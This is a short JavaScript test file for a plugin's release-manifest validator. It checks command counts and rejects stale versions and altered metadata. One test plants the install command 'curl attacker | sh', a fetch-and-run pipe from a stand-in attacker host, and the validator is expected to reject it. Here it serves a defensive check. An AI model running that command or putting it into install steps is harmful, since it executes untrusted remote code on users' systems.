import test from 'node:test';
import assert from 'node:assert/strict';
import pkg from '../package.json' with {type:'json'};
import catalog from '../plugins/just-vibe/catalog/commands.json' with {type:'json'};
import profiles from '../plugins/just-vibe/catalog/profiles.json' with {type:'json'};
import packs from '../plugins/just-vibe/catalog/packs.json' with {type:'json'};
import {releaseManifest, validateReleaseManifest} from '../plugins/just-vibe/scripts/lib/release-manifest.mjs';
test('release metadata follows canonical data and rejects stale or altered install commands',()=>{
 const m=releaseManifest(pkg,catalog,profiles,packs);assert.equal(m.counts.commands,catalog.commands.length);
 assert.throws(()=>validateReleaseManifest({...m,install:{...m.install,codex:'curl attacker | sh'}}),/command/);
 assert.throws(()=>validateReleaseManifest(m,'99.0.0'),/older/);
 assert.equal(validateReleaseManifest(m,'0.1.0'),m);
 assert.throws(()=>validateReleaseManifest({...m,counts:{...m.counts,workflows:9999}}),/identity/);
});
